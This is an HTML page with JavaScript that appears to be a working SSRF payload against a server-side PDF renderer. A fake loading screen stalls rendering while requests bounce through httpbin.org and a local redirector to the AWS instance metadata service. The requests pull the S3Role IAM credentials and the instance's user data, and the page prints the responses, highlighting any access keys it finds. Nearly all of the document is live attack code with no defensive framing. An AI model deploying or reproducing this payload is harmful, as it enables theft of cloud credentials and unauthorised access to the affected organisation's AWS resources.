<!DOCTYPE html>
<html>
<head>
    <title>Loading AWS Metadata...</title>
    <style>
        /* Force visual loading state */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: #f0f0f0;
        }
        
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #ffffff;
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        
        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .progress-bar {
            width: 300px;
            height: 20px;
            background: #f0f0f0;
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0;
        }
        
        .progress-fill {
            height: 100%;
            background: #3498db;
            width: 0%;
            animation: progress 25s linear forwards;
        }
        
        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        
        .main-content {
            display: none;
        }
        
        .result-box {
            border: 3px solid #000;
            margin: 15px 0;
            padding: 20px;
            background: #fff;
            min-height: 150px;
        }
        
        .credentials-found {
            background: #ff4444 !important;
            color: white;
            border: 5px solid #cc0000 !important;
            font-size: 18px;
            font-weight: bold;
            text-align: center;
            padding: 30px;
        }
        
        .success {
            background: #44ff44 !important;
            border-color: #00cc00 !important;
        }
    </style>
</head>
<body>
    <!-- Loading screen that forces delay -->
    <div class="loading-screen" id="loadingScreen">
        <div class="spinner"></div>
        <h2>ğŸ”„ Loading AWS Metadata Services...</h2>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        <p id="loadingStatus">Initializing connection...</p>
        <p><strong>PDF Generation: Please wait 30 seconds for complete data loading</strong></p>
    </div>
    
    <!-- Main content (hidden initially) -->
    <div class="main-content" id="mainContent">
        <h1>ğŸ¯ AWS Metadata Extraction Results</h1>
        
        <div class="result-box" id="result1">
            <h2>ğŸ“‹ Test 1: AWS Metadata v1.0 Root Directory</h2>
            <div id="result1-content">Loading...</div>
        </div>
        
        <div class="result-box" id="result2">
            <h2>ğŸ”‘ Test 2: S3Role IAM Credentials</h2>
            <div id="result2-content">Loading...</div>
        </div>
        
        <div class="result-box" id="result3">
            <h2>ğŸ“„ Test 3: AWS User Data</h2>
            <div id="result3-content">Loading...</div>
        </div>
        
        <div class="result-box" id="result4">
            <h2>ğŸ•°ï¸ Test 4: Legacy API (2007-01-19)</h2>
            <div id="result4-content">Loading...</div>
        </div>
        
        <div class="result-box" id="summary">
            <h2>ğŸ“Š FINAL SUMMARY</h2>
            <div id="summary-content">Tests in progress...</div>
        </div>
    </div>
    
    <script>
        var testResults = [];
        var loadingMessages = [
            "Initializing connection...",
            "Establishing SSRF chain...", 
            "Connecting to httpbin.org...",
            "Redirecting to internal redirector...",
            "Accessing AWS metadata service...",
            "Attempting credential extraction...",
            "Processing responses...",
            "Finalizing results..."
        ];
        
        var currentMessage = 0;
        
        // Update loading messages
        function updateLoadingStatus() {
            if(currentMessage < loadingMessages.length) {
                document.getElementById('loadingStatus').textContent = loadingMessages[currentMessage];
                currentMessage++;
                setTimeout(updateLoadingStatus, 3000);
            }
        }
        
        // Start loading messages
        updateLoadingStatus();
        
        // Execute requests during loading period
        setTimeout(function() {
            makeRequest('http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/', 'result1');
        }, 5000);
        
        setTimeout(function() {
            makeRequest('http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role', 'result2');
        }, 10000);
        
        setTimeout(function() {
            makeRequest('http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data', 'result3');
        }, 15000);
        
        setTimeout(function() {
            makeRequest('http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/S3Role', 'result4');
        }, 20000);
        
        function makeRequest(url, resultId) {
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', url, false);
                xhr.send();
                
                var result = xhr.responseText;
                var content = "<strong>URL:</strong> " + url + "<br><br>";
                content += "<strong>Response (" + result.length + " bytes):</strong><br>";
                content += "<pre style='white-space:pre-wrap;word-wrap:break-word;background:#f9f9f9;padding:15px;border:1px solid #ccc;'>" + result + "</pre>";
                
                document.getElementById(resultId + '-content').innerHTML = content;
                
                // Check for AWS credentials
                if(result.includes('AccessKeyId') || result.includes('SecretAccessKey')) {
                    document.getElementById(resultId).className += ' credentials-found';
                    document.getElementById(resultId + '-content').innerHTML = 
                        "ğŸš¨ğŸš¨ğŸš¨ AWS CREDENTIALS DETECTED! ğŸš¨ğŸš¨ğŸš¨<br><br>" + content;
                } else if(result.length > 50) {
                    document.getElementById(resultId).className += ' success';
                }
                
                testResults.push({
                    test: resultId,
                    url: url,
                    response: result,
                    hasCredentials: result.includes('AccessKeyId')
                });
                
            } catch(e) {
                document.getElementById(resultId + '-content').innerHTML = 
                    "<strong>ERROR:</strong> " + e.message + "<br><br><strong>URL:</strong> " + url;
                
                testResults.push({
                    test: resultId,
                    url: url,
                    response: "ERROR: " + e.message,
                    hasCredentials: false
                });
            }
        }
        
        // Hide loading screen and show results after 25 seconds
        setTimeout(function() {
            document.getElementById('loadingScreen').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            
            // Generate summary
            var summary = "<h3>ğŸ¯ Execution Complete</h3>";
            summary += "<p><strong>Tests completed:</strong> " + testResults.length + "</p>";
            
            var credentialsFound = testResults.filter(r => r.hasCredentials);
            if(credentialsFound.length > 0) {
                summary += "<div style='background:#ff0000;color:white;padding:20px;margin:15px 0;border:3px solid #000;text-align:center;font-size:16px;'>";
                summary += "ğŸ‰ğŸ‰ğŸ‰ AWS CREDENTIALS FOUND IN " + credentialsFound.length + " TEST(S)! ğŸ‰ğŸ‰ğŸ‰";
                summary += "</div>";
            } else {
                summary += "<p>âŒ No AWS credentials detected in responses</p>";
            }
            
            summary += "<h4>ğŸ“‹ Response Summary:</h4>";
            testResults.forEach(function(result, index) {
                summary += "<p><strong>Test " + (index + 1) + ":</strong> " + result.response.length + " bytes";
                if(result.hasCredentials) summary += " âœ… CREDENTIALS!";
                summary += "</p>";
            });
            
            document.getElementById('summary-content').innerHTML = summary;
            
        }, 25000);
    </script>
</body>
</html>
